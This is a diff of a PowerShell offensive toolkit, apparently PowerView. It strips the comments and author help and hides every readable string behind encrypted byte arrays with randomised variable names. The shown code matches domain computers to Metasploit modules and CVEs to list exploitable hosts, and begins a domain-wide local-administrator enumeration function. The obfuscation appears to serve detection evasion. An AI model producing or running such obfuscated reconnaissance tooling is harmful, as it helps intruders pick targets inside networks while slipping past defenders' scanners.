+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(229,142,183,4,201,244,133,232,18,234,241,232,129,41,217,129,230,131,56,244,254,214,154,6,222,202,254,136,60,244,142,129) @(179,188,219,113,147)),"",(ParseEntry20 @(202,244,153,79,242,235,200,72,244,239,200,11,241,251,196,83,242,159,149,66,220,159,149,72,242,194,188,78,242,244,188,79,222,234,201,79,222,232,167,94,244,158,157,77,243,219,204,5) @(144,172,241,56)),(ParseEntry20 @(125,210,18,105,26,115,115,236,12,106,29,4,120,227,117,51,29,90,74,241,26,1,43,95,125,205,56,35,53,90,82,236,34,10,64,93,120,247,21,47,52,93,93,237,14,26,73,79,81,222,39,46,53,64,33,167) @(28,154,64,89,121,55)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(21,116,98,168,56,7,178,112,37,119,159,54,26,211,9,116,84,133,43,39,198,41,7,121,146,35,125,182) @(67,70,14,221,98,64,139)),(ParseEntry20 @(194,30,94,104,174,112,251,70,82,66,136,76,206,123,70,99,131,89,222,17) @(151,44,8,17,202,29)),(ParseEntry20 @(28,114,140,253,139,1,19,148,238,170,127,25,133,221,220,45,72,215,238,147,10,25,170,254,176,47,19,144,233,147,7,31,188,240,168,119,103,162,179,147,36,125,173,243,177,116,31,136,208,219,127,26,133,221,175,118,112,178,179,132,34,125,209,224,177,116,70,145,208,174,16,30) @(70,42,228,138,233)),(ParseEntry20 @(29,10,25,44,121,56,45,61,80,41,24,113,47,101,47,22,38,38,74,113,38,26,25,116,123,43,58,49,80,119,50,52,41,79,35,22,38,38,73,108,49,40,10,107,85,47,114,49,81,78,61,56) @(124,66,75,28,26)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(61,248,148,184,187,2,41,109,8,179,186,153,187,29,90,108,49,146,177,170,172,47,81,41,36,139,197,240) @(107,202,248,205,225,69,16,94)),(ParseEntry20 @(130,60,231,59,13,244,41,189,84,226,0,56,192,18,153,124,248,6,32,164) @(215,14,177,66,105,153,69)),(ParseEntry20 @(34,247,17,220,198,104,151,199,28,236,64,152,197,120,155,220,26,156,29,209,232,28,224,195,33,198,64,223,199,85,235,192,32,213,56,153,233,121,151,205,27,232,64,221,198,103,224,205) @(120,175,121,171,164,47,174,183)),(ParseEntry20 @(44,41,104,224,7,253,219,59,45,9,180,87,221,205,120,11,94,189,50,210,238,21,51,82,177,51,193,206,1,12,116,166,6,234,141,39,5,87,133,18,244,222,12,25,119,147,84,192,250,55,40,15) @(77,97,58,208,100,185,180)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(56,106,172,81,118,253,121,93,59,185,102,120,224,24,36,106,154,124,101,221,13,4,25,183,107,109,135,125) @(110,88,192,36,44,186,64)),"",(ParseEntry20 @(152,198,31,14,160,217,78,9,166,221,78,74,163,201,66,18,160,173,19,3,142,173,57,13,155,247,78,13,161,228,54,77,154,228,54,75,140,175,78,12,152,198,37,17,161,217,28,68) @(194,158,119,121)),(ParseEntry20 @(115,207,113,238,153,120,99,100,203,16,186,201,88,117,39,237,71,179,172,87,86,74,213,75,191,173,68,118,94,234,109,168,152,111,53,120,227,78,139,140,113,102,83,240,108,157,202,12,65,120,210,84) @(18,135,35,222,250,60,12)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(3,44,50,20,139,43,213,73,54,103,28,53,139,52,166,72,15,70,23,6,156,6,173,13,26,95,99,92) @(85,30,94,97,209,108,236,122)),"",(ParseEntry20 @(87,169,250,225,210,115,13,125,149,209,175,131,85,99,56,154,240,165,212,78,120,62,191,230,207,217,13,64,110,139,211,163,232,78,117,60,188,212,175,202,86,99,68,136,202,164,133,88,110,63,200,162,247,231,114,4,87,167,171,251,212,99,1,103,169,160,250,197,110,115,91,197) @(13,241,146,150,176,52,52)),(ParseEntry20 @(100,56,242,164,102,52,207,226,73,67,196,167,97,9,149,254,97,29,246,255,95,40,242,252,100,39,216,238,73,29,238,226,103,35,153,254,97,29,245,226,72,26,225,227,74,35,144,238,72,36,225,238) @(5,112,160,148)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(202,33,117,140,58,167,14,104,255,106,91,173,58,184,125,105,198,75,80,158,45,138,118,44,211,82,36,196) @(156,19,25,249,96,224,55,91)),"",(ParseEntry20 @(131,117,63,126,210,157,255,169,73,20,48,131,187,145,236,70,53,58,212,160,138,234,99,35,80,217,227,178,186,87,18,126,232,160,135,235,96,1,48,202,185,129,224,91,53,65,254,160) @(217,45,87,9,176,218,198)),(ParseEntry20 @(41,55,149,178,238,45,39,9,139,177,233,90,44,6,242,232,233,4,30,20,157,218,223,1,41,40,191,248,193,4,6,9,165,209,180,3,44,18,146,244,192,3,9,7,138,193,189,16,6,5,142,183) @(72,127,199,130,141,105)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(121,138,144,191,129,104,129,207,169,162,109,236,166,146,145,29,226,164,131,188,98,210,189,189,148,108,250,175,135,188,18,133) @(47,184,252,202,219)),"",(ParseEntry20 @(212,152,186,94,236,135,235,89,234,131,235,26,239,151,231,66,236,243,182,83,194,243,156,93,215,169,235,93,237,186,151,94,214,186,147,27,195,150,235,83,237,135,235,95,236,136,156,83) @(142,192,210,41)),(ParseEntry20 @(92,162,0,197,130,93,82,139,113,217,54,198,133,96,8,151,89,135,4,158,187,65,111,149,92,189,42,143,173,116,115,139,95,185,107,159,133,116,104,139,112,128,19,141,172,90,13,132,115,144,27,192) @(61,234,82,245,225,25,61,253)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(63,20,47,209,113,9,80,90,69,58,230,124,47,49,39,22,26,245,22,115) @(105,38,67,164,43,78,105)),(ParseEntry20 @(203,154,97,142,63,243,254,78,190,29,220,192,110,197,40,249,229,102,202,102) @(158,168,55,247,91)),(ParseEntry20 @(194,252,230,172,226,223,157,254,191,195,161,151,239,140,181,243,198,189,191,250,212,151,192,175,217,241,157,250,184,250,217,144,214,161,193,170,234,191,226,245,194,252,220,179,227,223,207,179) @(152,164,142,219,128)),(ParseEntry20 @(156,92,178,174,150,194,146,98,172,173,145,181,153,109,213,244,145,235,171,127,186,198,167,238,156,67,152,228,185,235,179,98,130,205,204,236,153,121,181,232,184,236,188,99,175,221,197,182,176,126,181,233) @(253,20,224,158,245,134)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(109,234,244,209,97,159,161,151,88,161,218,243,90,128,214,148,98,137,165,153) @(59,216,152,164)),(ParseEntry20 @(21,124,251,130,215,45,24,212,178,245,2,38,244,201,192,39,3,252,198,142) @(64,78,173,251,179)),(ParseEntry20 @(225,71,6,230,48,50,242,203,123,45,168,97,20,156,142,116,12,162,54,15,135,136,81,26,200,59,76,191,216,101,47,164,10,15,138,138,82,40,168,40,23,156,242,102,54,163,103,25,145,137,38,94,240,5,51,251,225,73,87,252,54,34,254,209,71,92,253,39,47,140,237,43) @(187,31,110,145,82,117,203)),(ParseEntry20 @(29,197,33,17,170,56,226,5,109,250,24,190,23,88,252,22,233,30,119,162,38,213,33,73,168,43,245,9,109,164,50,251,17,114,240,22,233,30,116,191,49,231,50,86,134,47,189,9,108,157,61,247) @(124,141,115,33,201)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(185,110,38,176,101,246,214,111,41,188,125,230,142,4,4,245,102,224,210,97) @(239,92,74,197,63,177)),(ParseEntry20 @(214,103,129,0,77,219,206,32,202,19,149,17,112,132,235,62,206,4,234,68) @(131,85,215,121,41,182,152,89)),(ParseEntry20 @(29,135,209,174,117,0,230,201,189,84,126,236,216,142,34,44,189,138,189,109,11,236,247,173,78,46,230,205,186,109,2,168,225,163,86,117,146,239,224,109,36,152,128,175,117,15,145,195) @(71,223,185,217,23)),(ParseEntry20 @(93,192,140,227,250,120,231,168,159,170,88,187,186,170,172,86,236,179,133,242,102,208,140,187,248,107,240,164,159,244,114,254,188,128,160,86,236,179,134,239,113,226,159,171,212,127,184,167,157,227,117,189) @(60,136,222,211,153)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(67,207,73,154,192,57,81,38,158,92,173,205,31,48,91,205,124,190,167,67) @(21,253,37,239,154,126,104)),(ParseEntry20 @(218,118,88,245,63,226,40,100,214,8,205,21,87,219,21,253,13,74,197,102) @(143,68,14,140,91)),(ParseEntry20 @(192,169,71,213,161,221,200,95,198,128,163,194,78,245,246,241,147,28,198,185,214,194,97,214,154,243,200,91,193,185,219,196,119,216,130,171,188,105,155,185,248,166,102,219,155,168,196,67,248,241,163,193,78,245,133,170,171,121,155,174,254,166,26,200,155,168,157,90,248,132,204,197) @(154,241,47,162,195)),(ParseEntry20 @(45,210,241,193,115,65,88,58,214,144,149,35,97,78,121,240,199,156,70,110,109,20,200,203,144,71,125,77,0,247,237,135,114,86,14,38,254,206,164,102,72,93,13,237,236,162,32,127,122,24,219,217) @(76,154,163,241,16,5,55)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(106,104,254,2,84,123,99,161,20,119,126,13,243,47,64,12,3,195,74,51) @(60,90,146,119,14)),(ParseEntry20 @(189,56,224,181,140,103,218,166,178,89,244,157,177,93,248,190,161,78,255,241) @(232,10,182,204)),(ParseEntry20 @(183,146,120,108,126,217,212,186,116,88,37,173,140,157,37,112,126,173,137,176,92,40,82,234,180,163,41,111,127,228,168,189,72,97,93,172,160,156,41,97,127,217,212,188,114,83,82,228) @(237,202,16,27,28,158)),(ParseEntry20 @(231,195,115,111,229,207,78,41,202,184,69,108,226,242,20,53,226,230,119,52,220,211,115,55,231,220,89,37,202,230,111,41,228,216,24,53,226,230,116,41,203,225,96,39,203,200,17,38,200,241,104,106) @(134,139,33,95)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(207,220,8,48,95,117,142,35,250,151,38,18,100,106,249,32,192,191,89,120) @(153,238,100,69,5,50,183,16)),"",(ParseEntry20 @(41,114,158,204,159,36,18,37,23,105,207,136,156,52,30,62,17,25,146,193,177,80,101,33,42,67,207,207,158,25,106,97,43,80,183,137,179,82,18,32,41,114,164,211,158,36,64,104) @(115,42,246,187,253,99,43,85)),(ParseEntry20 @(180,75,172,246,235,145,108,136,138,187,177,48,154,191,189,191,103,147,144,227,143,91,172,174,233,130,123,132,138,229,155,117,156,149,177,191,103,147,147,254,152,105,191,177,199,150,51,206,139,226,128,116) @(213,3,254,198,136)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(232,8,235,173,253,69,69,141,89,254,154,240,99,36,240,10,222,137,154,63) @(190,58,135,216,167,2,124)),"",(ParseEntry20 @(133,235,161,244,202,147,230,195,173,192,145,231,190,228,252,232,202,231,187,201,133,176,230,160,134,218,240,247,203,174,158,134,145,249,233,229,146,245,240,249,202,131,150,202,145,177,157,184,133,129,240,179,201,131,153,131,147,213,145,185,187,228,252,233,240,230,179,198,147,196,254,224) @(223,179,201,131,168,212)),(ParseEntry20 @(44,208,255,167,52,9,247,219,219,100,41,171,201,238,98,39,252,192,193,60,23,192,255,255,54,26,224,215,219,58,3,238,207,196,110,39,252,192,194,33,0,242,236,224,24,30,168,215,218,3,12,226) @(77,152,173,151,87)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(240,79,27,7,252,58,78,65,197,4,53,43,243,60,74,79) @(166,125,119,114)),(ParseEntry20 @(12,238,92,213,203,200,15,165,67,234,237,205,0,238,121,203,226,244,100,225) @(89,220,10,172,175,165)),(ParseEntry20 @(100,147,183,27,248,121,242,175,8,217,7,248,190,59,175,85,169,236,8,224,114,249,141,6,192,102,129,168,53,227,7,191,188,22,219,68,147,165,45,227,112,167,230,7,195,12,242,171) @(62,203,223,108,154)),(ParseEntry20 @(48,236,179,183,216,21,203,151,203,136,53,151,133,254,142,59,192,140,209,208,11,252,179,239,218,6,220,155,203,214,31,210,131,212,130,59,192,140,210,205,28,206,160,240,246,40,148,150,202,193,4,221,173,240,134,108) @(81,164,225,135,187)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(114,130,143,119,219,255,29,131,128,123,195,225,113,241,222,63) @(36,176,227,2,129,184)),(ParseEntry20 @(6,98,240,45,241,62,6,223,29,211,17,56,255,102,230,52,29,247,105,168) @(83,80,166,84,149)),(ParseEntry20 @(13,164,110,61,253,73,88,39,152,69,115,172,111,54,98,151,100,121,251,116,45,101,174,108,16,199,68,22,14,133,63,62,252,116,32,102,164,124,11,231,64,80,110,136,101,120,174,118) @(87,252,6,74,159,14,97)),(ParseEntry20 @(64,158,122,127,27,101,185,94,3,75,69,229,76,54,77,75,178,69,25,19,123,142,122,39,25,118,174,82,3,21,111,160,74,28,65,75,178,69,26,14,108,188,105,56,54,114,230,95,2,60,116,227) @(33,214,40,79,120)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(41,63,75,159,46,173,190,76,110,94,168,45,191,198,66,48) @(127,13,39,234,116,234,135)),(ParseEntry20 @(39,211,133,55,130,28,192,11,168,149,12,142,40,164,1,134,158,31,219,76) @(114,225,211,78,230,113,150)),(ParseEntry20 @(237,28,201,51,213,3,152,52,211,7,152,119,214,19,148,47,213,119,197,62,251,119,239,48,238,45,152,48,212,62,224,116,239,62,224,60,250,18,152,55,212,118,231,62,212,51,156,121) @(183,68,161,68)),(ParseEntry20 @(242,144,74,53,74,57,221,60,223,235,124,54,77,4,135,32,247,181,78,110,115,37,224,34,242,143,96,127,101,16,252,60,241,139,33,111,77,16,231,60,222,178,89,114,100,4,130,61,221,140,85,127,101,10,143,119) @(147,216,24,5,41,125,178,74)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(94,18,181,119,200,168,40,59,67,160,64,203,186,80,53,29) @(8,32,217,2,146,239,17)),(ParseEntry20 @(177,74,25,155,128,21,25,155,173,62,13,138,189,74,60,133,169,41,114,223) @(228,120,79,226)),(ParseEntry20 @(193,93,225,137,249,66,176,142,255,70,176,205,250,82,188,149,249,54,237,132,215,54,199,138,194,108,176,138,248,127,200,207,195,127,200,132,212,83,176,137,249,107,200,195) @(155,5,137,254)),(ParseEntry20 @(100,99,229,233,208,65,68,193,149,128,97,24,211,160,134,111,79,218,143,216,95,115,229,177,210,82,83,205,149,222,75,93,213,138,138,111,79,218,140,197,72,65,246,174,253,86,27,207,150,231,98,81) @(5,43,183,217,179)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(129,176,173,200,141,197,248,142,180,251,131,228,130,195,252,128) @(215,130,193,189)),(ParseEntry20 @(30,233,105,56,172,232,66,50,146,121,3,160,220,38,56,188,114,16,245,184) @(75,219,63,65,200,133,20)),(ParseEntry20 @(101,102,213,17,102,120,7,205,2,71,6,13,220,49,49,84,92,142,2,126,115,13,243,18,93,86,7,201,5,126,126,12,229,28,69,15,115,251,95,113,101,102,239,14,103,120,85,128) @(63,62,189,102,4)),(ParseEntry20 @(55,192,218,58,199,103,4,204,26,187,236,57,192,90,94,208,50,229,222,97,254,123,57,210,55,223,240,112,232,78,37,204,52,219,177,96,192,78,62,204,27,226,201,125,234,74,91,192,24,204,197,63) @(86,136,136,10,164,35,107,186)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(214,45,245,44,215,199,38,170,58,244,194,70,204,24,176,189) @(128,31,153,89,141)),(ParseEntry20 @(7,82,175,95,57,63,12,147,124,14,16,49,160,113,19,32,41,189,111,96) @(82,96,249,38,93)),(ParseEntry20 @(204,208,141,161,201,138,175,248,129,149,146,254,247,223,208,189,201,254,242,242,169,228,249,167,204,208,175,161,242,180,175,252,134,172,234,252,206,242,164,174,229,252,175,252,134,228,154,181) @(150,136,229,214,171,205)),(ParseEntry20 @(49,115,13,140,132,85,4,38,119,108,216,212,117,18,101,81,59,209,177,122,49,8,105,55,221,176,105,17,28,86,17,202,133,66,82,58,95,50,233,145,92,1,17,76,17,239,215,102,38,20,110,106) @(80,59,95,188,231,17,107)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(195,123,85,99,71,228,80,166,42,64,84,68,246,40,168,116) @(149,73,57,22,29,163,105)),(ParseEntry20 @(250,85,43,238,203,10,17,253,245,52,63,198,246,48,51,229,230,35,52,170) @(175,103,125,151)),(ParseEntry20 @(164,183,65,4,126,185,214,89,23,95,199,220,72,36,41,149,141,26,23,102,178,220,103,7,69,151,214,93,16,102,191,221,113,9,93,206,162,111,74,105,164,183,123,27,127,185,132,20) @(254,239,41,115,28)),(ParseEntry20 @(188,142,154,177,91,122,13,138,145,245,172,178,92,71,87,150,185,171,158,234,98,102,48,148,188,145,176,251,116,83,44,138,191,149,241,235,92,83,55,138,144,172,137,246,118,87,82,134,147,130,133,180) @(221,198,200,129,56,62,98,252)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(184,84,43,82,54,169,95,116,68,21,172,63,18,102,81,211) @(238,102,71,39,108)),(ParseEntry20 @(241,228,192,21,241,142,174,101,254,133,212,61,204,180,140,125,237,146,223,81) @(164,214,150,108,149,227,194,15)),(ParseEntry20 @(58,236,188,187,165,36,232,16,208,151,245,244,2,134,85,223,182,255,163,25,157,83,250,160,149,174,90,165,3,206,149,254,159,25,144,82,250,184,245,178,7,227,38,195,181,157,250,94) @(96,180,212,204,199,99,209)),(ParseEntry20 @(101,192,33,213,103,204,28,147,72,187,23,214,96,241,70,143,96,229,37,142,94,208,33,141,101,223,11,159,72,229,61,147,102,219,74,143,96,229,38,147,73,226,50,146,74,225,67,213,74,226,20,209) @(4,136,115,229)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(129,108,183,107,57,223,238,109,184,103,33,193,130,31,230,35) @(215,94,219,30,99,152)),(ParseEntry20 @(144,230,193,123,177,171,194,175,142,196,64,132,159,249,139,166,222,70,156,251) @(197,212,151,2,213,198,174)),(ParseEntry20 @(26,61,231,35,49,241,121,21,235,23,106,133,33,50,186,63,49,133,36,31,195,103,29,194,25,12,182,32,48,204,1,87,215,46,18,133,13,35,182,103,50,133,14,31,235,57,30,139) @(64,101,143,84,83,182)),(ParseEntry20 @(163,41,208,112,151,216,173,23,206,115,144,175,166,24,183,42,144,241,148,10,216,24,166,244,163,54,250,58,184,241,140,23,224,19,205,246,166,12,215,54,185,246,131,22,204,41,196,172,140,11,233,56) @(194,97,130,64,244,156)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(241,107,152,141,209,230,235,250,196,32,182,161,222,224,239,244) @(167,89,244,248,139,161,210,201)),(ParseEntry20 @(167,82,78,161,144,215,145,35,168,51,90,137,173,237,179,59,187,36,81,229) @(242,96,24,216,244,186,253,73)),(ParseEntry20 @(48,166,186,63,246,83,27,36,14,189,235,123,245,67,23,63,8,205,182,50,216,39,108,32,51,151,235,60,247,110,99,96,50,132,147,122,218,37,27,33,48,166,128,32,247,83,73,105) @(106,254,210,72,148,20,34,84)),(ParseEntry20 @(124,228,254,22,75,61,124,107,224,159,66,27,29,106,40,198,200,75,126,18,73,69,254,196,71,127,1,105,81,193,226,80,74,42,42,119,200,193,115,94,52,121,92,219,227,101,24,73,94,119,249,219) @(29,172,172,38,40,121,19)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(14,86,133,169,35,119,44,107,7,144,158,32,101,84,101,89) @(88,100,233,220,121,48,21)),(ParseEntry20 @(68,125,185,65,50,15,176,123,21,188,122,7,59,139,95,61,166,124,31,95) @(17,79,239,56,86,98,220)),(ParseEntry20 @(135,56,45,232,191,39,124,239,185,35,124,172,188,55,112,244,191,83,33,229,145,83,11,235,132,9,124,235,190,26,0,232,133,26,4,173,144,54,124,229,190,39,124,233,191,40,11,229) @(221,96,69,159)),(ParseEntry20 @(61,169,215,227,120,24,142,243,159,40,56,210,225,170,46,54,133,232,133,112,6,185,215,187,122,11,153,255,159,118,18,151,231,128,34,54,133,232,134,109,17,139,196,171,86,31,209,252,157,97,21,212) @(92,225,133,211,27)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(31,222,138,106,167,14,213,213,124,132,11,181,179,94,192,116) @(73,236,230,31,253)),(ParseEntry20 @(62,162,226,178,31,144,191,163,49,195,246,154,34,170,157,187,34,212,249,246) @(107,144,180,203,123,253,211,201)),(ParseEntry20 @(190,57,123,94,205,40,221,17,119,106,150,92,133,54,38,66,205,92,128,27,95,26,225,27,189,8,42,93,204,21,165,85,75,83,238,93,170,80,42,92,245,55,182,9,112,110,196,82) @(228,97,19,41,175,111)),(ParseEntry20 @(235,90,46,129,233,86,19,199,198,33,24,130,238,107,73,219,238,127,42,218,208,74,46,217,235,69,4,203,198,127,50,199,232,65,69,219,238,127,41,199,199,120,61,198,197,81,76,129,199,120,41,198) @(138,18,124,177)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(53,47,94,141,16,112,90,46,81,129,8,110,54,92,15,197) @(99,29,50,248,74,55)),(ParseEntry20 @(101,84,9,112,71,194,196,90,60,12,75,114,246,255,126,20,22,77,110,146) @(48,102,95,9,35,175,168)),(ParseEntry20 @(41,130,158,153,17,157,207,158,23,153,207,221,18,141,195,133,17,233,146,148,63,233,184,154,42,179,207,154,16,160,179,153,43,160,183,220,62,140,207,148,16,157,207,152,17,146,184,148) @(115,218,246,238)),(ParseEntry20 @(62,210,147,145,155,27,245,183,237,203,59,169,165,216,205,53,254,172,247,147,5,194,147,201,153,8,226,187,237,149,17,236,163,242,193,53,254,172,244,142,18,240,128,217,181,28,170,184,239,130,22,175) @(95,154,193,161,248)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(40,253,69,111,215,193,10,170,29,182,107,67,216,199,14,164) @(126,207,41,26,141,134,51,153)),"",(ParseEntry20 @(194,81,90,9,250,78,11,14,252,74,11,77,249,94,7,21,250,58,86,4,212,59,96,20,194,81,120,9,193,112,11,10,251,115,115,4,192,115,115,7,214,101,11,21,193,59,11,10) @(152,9,50,126)),(ParseEntry20 @(175,174,146,229,16,169,238,184,170,243,177,64,137,248,251,140,164,184,37,134,219,150,180,168,180,36,149,251,130,139,142,163,17,190,184,164,130,173,128,5,160,235,143,145,141,172,67,154,204,180,179,185,153,4,208,188) @(206,230,192,213,115,237,129)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(209,15,66,227,28,100,190,14,77,239,4,122,210,124,19,171) @(135,61,46,150,70,35)),"",(ParseEntry20 @(80,250,164,200,241,83,191,116,110,225,245,140,242,67,179,111,104,145,168,197,223,38,212,110,80,250,134,200,202,109,191,112,105,216,141,142,203,110,199,124,68,147,245,203,240,38,183,124) @(10,162,204,191,147,20,134,4)),(ParseEntry20 @(187,40,254,220,210,157,181,22,224,223,213,234,190,25,153,134,213,180,140,11,246,180,227,177,187,55,212,150,253,180,148,22,206,191,136,179,190,13,249,154,252,179,155,23,226,191,129,174,151,36,249,217) @(218,96,172,236,177,217)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(11,247,167,81,7,130,242,23,62,188,137,125,8,132,246,25) @(93,197,203,36)),"",(ParseEntry20 @(171,64,98,55,147,95,51,48,149,91,51,115,144,79,63,43,147,43,110,58,189,43,68,52,168,113,51,52,146,98,75,114,169,98,75,112,188,94,51,53,171,64,88,40,146,95,97,125) @(241,24,10,64)),(ParseEntry20 @(135,14,219,112,245,79,231,144,10,186,36,165,111,241,211,44,237,45,192,96,210,190,20,225,33,193,115,242,170,43,199,54,244,88,177,140,34,228,21,224,70,226,167,49,199,41,166,113,198,162,11,188) @(230,70,137,64,150,11,136)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(236,236,251,21,176,159,131,237,244,25,168,129,239,159,170,93) @(186,222,151,96,234,216)),"",(ParseEntry20 @(102,70,66,157,97,251,72,76,122,105,211,48,221,38,9,117,72,217,103,198,61,15,80,94,179,106,133,5,95,100,107,222,91,198,48,14,80,27,211,118,230,41,110,118,73,173,104,129) @(60,30,42,234,3,188,113)),(ParseEntry20 @(149,58,5,111,187,70,155,4,27,108,188,49,144,11,98,53,188,111,162,25,13,7,138,106,149,37,47,37,148,111,186,4,53,12,225,104,144,31,2,41,149,104,181,5,24,28,232,50,185,24,2,40) @(244,114,87,95,216,2)))  
+    Write-Verbose (ParseEntry20 @(74,13,211,252,15,13,55,114,46,244,214,52,41,46,40,26,234,223,8,62,27,69,54,146,252,1,30,0,126,13,225,245,36,123,48,122,16,205,206,53,42,20,75,13,250,207,12,59,35,78,54,243,205,63,10,17,127,25,242,255,19,121,56,122,22,228,206,116,18,46,101,14,239,241,114,61) @(29,116,163,152,70,72,121))
+    $oXT4XXjv = New-Object System.Data.DataTable 
+    $Null = $oXT4XXjv.Columns.Add('ComputerName')
+    $Null = $oXT4XXjv.Columns.Add('OperatingSystem')
+    $Null = $oXT4XXjv.Columns.Add('ServicePack')
+    $Null = $oXT4XXjv.Columns.Add('LastLogon')
+    $Null = $oXT4XXjv.Columns.Add('MsfModule')
+    $Null = $oXT4XXjv.Columns.Add('CVE')
+    $ChwBZi | ForEach-Object {
+        $bMEb4v = $_.OperatingSystem
+        $s2FKWjuk = $_.ServicePack
+        $HOvHl = $_.MsfModule
+        $rM34Wo = $_.CVE
+        $DKQK8x | ForEach-Object {
+            $YKQuG = $_.Hostname
+            $Ld81ye7 = $_.OperatingSystem
+            $fVLpRa7 = $_.ServicePack                                                        
+            $uh0x = $_.LastLogon
+            if ($Ld81ye7 -like ($bMEb4v + "*") -and $fVLpRa7 -like ($s2FKWjuk) ) {                    
+                $Null = $oXT4XXjv.Rows.Add($YKQuG,$Ld81ye7,$fVLpRa7,$uh0x,$HOvHl,$rM34Wo)
             }
         }
     }     
-    
-    # Display results
-    $Hv3lbsTF = $xtVUYRm | Select-Object ComputerName -Unique | Measure-Object
-    $ih3h = $Hv3lbsTF.Count
-    if ($Hv3lbsTF.Count -gt 0) {
-        # Return vulnerable server list order with some hack date casting
-        Write-Verbose ((HandleResult95 @(254,15,71,193,143,236,44,69,193,145,156,29,122,228,251,148) @(169,118,51,165,198)) + $ih3h + (HandleResult95 @(239,101,20,250,194,106,0,249,194,106,58,228,196,106,46,185,239,101,12,189,196,106,99,224,197,64,16,229,196,106,3,235,197,30,58,246,194,106,0,248,197,84,19,177) @(166,45,86,140)))
-        $xtVUYRm | Sort-Object { $_.lastlogon -as [datetime]} -Descending
+    $GRsbp41f = $oXT4XXjv | Select-Object ComputerName -Unique | Measure-Object
+    $O7OnEyQh = $GRsbp41f.Count
+    if ($GRsbp41f.Count -gt 0) {
+        Write-Verbose ((ParseEntry20 @(91,186,104,193,177,76,116,122,167,75,144,147,64,111,49,254) @(12,195,28,165,248,9,46)) + $O7OnEyQh + (ParseEntry20 @(238,206,192,175,44,153,168,210,226,197,181,32,188,185,223,179,203,145,18,239,156,224,179,238,186,37,152,151,197,193,215,190,43,237,146,221,226,197,143,60,189,135,226,187) @(167,134,130,217,72,222,254)))
+        $oXT4XXjv | Sort-Object { $_.lastlogon -as [datetime]} -Descending
     }
     else {
-        Write-Verbose (HandleResult95 @(231,216,194,113,150,142,133,215,186,93,133,250,210,230,198,121,188,166,246,200,145,82,138,172,211,146,159,111,187,140,230,213,144,108,157,248,234,249,185,121,150,140,234,215,151,66,234,160,252,198,206,40) @(176,161,243,21,223,203))
+        Write-Verbose (ParseEntry20 @(241,63,234,105,196,177,61,155,239,14,129,60,239,179,61,129,197,43,157,100,239,179,93,138,197,117,183,119,233,179,94,153,197,63,153,62,215,172,66,129,239,1,129,123,233,163,61,134,234,33,230,48) @(166,70,219,13,141,244,8,237))
     }
 }
-
-
 function Invoke-EnumerateLocalAdmin {
-<#
-    .SYNOPSIS
-
-        This function queries the domain for all active machines with
-        Get-NetComputer, then for each server it queries the local
-        Administrators with Get-NetLocalGroup.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .PARAMETER ComputerName
-
-        Host array to enumerate, passable on the pipeline.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to search.
-
-    .PARAMETER ComputerFilter
-
-        Host filter name to query AD for, wildcards accepted.
-
-    .PARAMETER ComputerADSpath
-
-        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER NoPing
-
-        Switch. Don't ping each host to ensure it's up before enumerating.
-
-    .PARAMETER Delay
-
-        Delay between enumerating hosts, defaults to 0
-
-    .PARAMETER Jitter
-
-        Jitter for the host delay, defaults to +/- 0.3
-
-    .PARAMETER OutFile
-
-        Output results to a specified csv output file.
-
-    .PARAMETER NoClobber
-
-        Switch. Don't overwrite any existing output file.
-
-    .PARAMETER TrustGroups
-
-        Switch. Only return results that are not part of the local machine
-        or the machine's domain. Old Invoke-EnumerateLocalTrustGroup
-        functionality.
-
-    .PARAMETER Domain
-
-        Domain to query for machines, defaults to the current domain.
-    
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER SearchForest
-
-        Switch. Search all domains in the forest for target users instead of just
-        a single domain.
-
-    .PARAMETER Threads
-
-        The maximum concurrent threads to execute.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-EnumerateLocalAdmin
-
-        Enumerates the members of local administrators for all machines
-        in the current domain.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-EnumerateLocalAdmin -Threads 10
-
-        Threaded local admin enumeration, replaces Invoke-EnumerateLocalAdminThreaded
-
-    .LINK
-
-        http://blog.harmj0y.net/
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [Switch]
         $NoPing,
-
         [UInt32]
         $Delay = 0,
-
         [Double]
         $Jitter = .3,
-
